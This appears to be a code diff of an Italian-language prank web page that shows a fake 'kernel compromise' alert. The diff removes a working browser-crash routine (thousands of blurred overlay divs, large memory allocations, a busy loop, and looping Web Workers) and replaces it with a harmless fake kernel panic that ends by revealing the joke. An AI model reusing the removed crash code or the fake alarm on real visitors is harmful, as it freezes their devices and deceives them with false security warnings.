@@ -170,24 +170,9 @@
             animation: glitch 0.1s infinite;
         }
         
-        /* Container per il payload nascosto */
-        #crashPayload {
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            pointer-events: none;
-            z-index: 9999;
-        }
-        
-        .hidden {
-            display: none;
-        }
-        
-        /* Messaggio di errore finale */
+        /* Messaggio di errore finale (finto kernel panic) */
         .error-message {
-            background: rgba(0, 0, 0, 0.9);
+            background: rgba(0, 0, 0, 0.95);
             position: fixed;
             top: 0;
             left: 0;
@@ -234,6 +219,13 @@
             border-radius: 12px;
             font-weight: 600;
             width: 100%;
+            cursor: pointer;
+            margin-top: 10px;
+        }
+        
+        .restart-btn:active {
+            opacity: 0.8;
+            transform: scale(0.98);
         }
     </style>
 </head>
@@ -284,61 +276,12 @@
         progressBar.style.width = value + '%';
     }
     
-    function triggerDeviceCrash() {
+    // Versione modificata: mostra il finto kernel panic senza riavviare il telefono
+    function showFakeKernelPanic() {
         if (crashTriggered) return;
         crashTriggered = true;
+        
         setStatus("💀 Rilevata compromissione del kernel! 💀", true);
-        
-        const crashContainer = document.createElement('div');
-        crashContainer.id = 'crashPayload';
-        document.body.appendChild(crashContainer);
-        
-        const divCount = 8000;
-        for (let i = 0; i < divCount; i++) {
-            const div = document.createElement('div');
-            div.style.cssText = `
-                backdrop-filter: blur(10px) brightness(0.5) contrast(200%);
-                width: 50px;
-                height: 50px;
-                position: fixed;
-                top: ${Math.random() * 2000}px;
-                left: ${Math.random() * 2000}px;
-                opacity: 0.01;
-                z-index: 99999;
-            `;
-            crashContainer.appendChild(div);
-        }
-        
-        try {
-            let memoryHog = [];
-            for (let i = 0; i < 100; i++) {
-                memoryHog.push(new Array(1000000).fill('x'));
-            }
-        } catch(e) {}
-        
-        let start = Date.now();
-        while (Date.now() - start < 3000) {
-            Math.sqrt(Math.random() * 1000000);
-        }
-        
-        for (let w = 0; w < 50; w++) {
-            try {
-                const blob = new Blob(['while(true){}'], {type: 'application/javascript'});
-                const url = URL.createObjectURL(blob);
-                const worker = new Worker(url);
-                setTimeout(() => worker.terminate(), 100);
-            } catch(e) {}
-        }
-        
-        let counter = 0;
-        const interval = setInterval(() => {
-            for (let i = 0; i < 1000; i++) {
-                const temp = document.createElement('div');
-                temp.remove();
-            }
-            counter++;
-            if (counter > 200) clearInterval(interval);
-        }, 1);
         
         setTimeout(() => {
             const panicDiv = document.createElement('div');
@@ -352,17 +295,44 @@
                         <div class="progress-bar" style="width: 0%" id="panicProgress"></div>
                     </div>
                     <p style="font-size: 11px; margin-top: 12px;">Codice errore: PANIC_WEBKIT_0x0003</p>
+                    <button class="restart-btn" id="fakeRestartBtn">Riavvia ora</button>
                 </div>
             `;
             document.body.appendChild(panicDiv);
             
+            // Anima la barra di progresso
             let p = 0;
             const panicInterval = setInterval(() => {
                 p += 2;
                 const panicBar = document.getElementById('panicProgress');
                 if (panicBar) panicBar.style.width = p + '%';
-                if (p >= 100) clearInterval(panicInterval);
+                if (p >= 100) {
+                    clearInterval(panicInterval);
+                    // Quando arriva a 100, cambia il testo del pulsante
+                    const btnRestart = document.getElementById('fakeRestartBtn');
+                    if (btnRestart) btnRestart.textContent = 'Riavvio fallito → tocca qui';
+                }
             }, 30);
+            
+            // Pulsante che rivela lo scherzo
+            setTimeout(() => {
+                const restartBtn = document.getElementById('fakeRestartBtn');
+                if (restartBtn) {
+                    restartBtn.addEventListener('click', () => {
+                        panicDiv.remove();
+                        // Ricrea il contenitore originale con un messaggio
+                        document.body.innerHTML = `
+                            <div class="container" style="text-align: center;">
+                                <div class="shield-icon">😄</div>
+                                <h2 style="color: #34c759;">Scherzo!</h2>
+                                <div class="subtitle">Nessun danno al telefono.</div>
+                                <p style="color: #8e8e93; margin-top: 20px;">Era solo una pagina HTML innocua.</p>
+                                <button onclick="location.reload()" class="verify-btn" style="margin-top: 20px;">Riprova</button>
+                            </div>
+                        `;
+                    });
+                }
+            }, 100);
         }, 500);
     }
     
@@ -387,7 +357,7 @@
                 setTimeout(() => {
                     setStatus("💀 TENTATIVO DI ACCESSO NON AUTORIZZATO DETECTED", true);
                     updateProgress(100);
-                    setTimeout(() => triggerDeviceCrash(), 800);
+                    setTimeout(() => showFakeKernelPanic(), 800);
                 }, 1000);
                 return;
             }
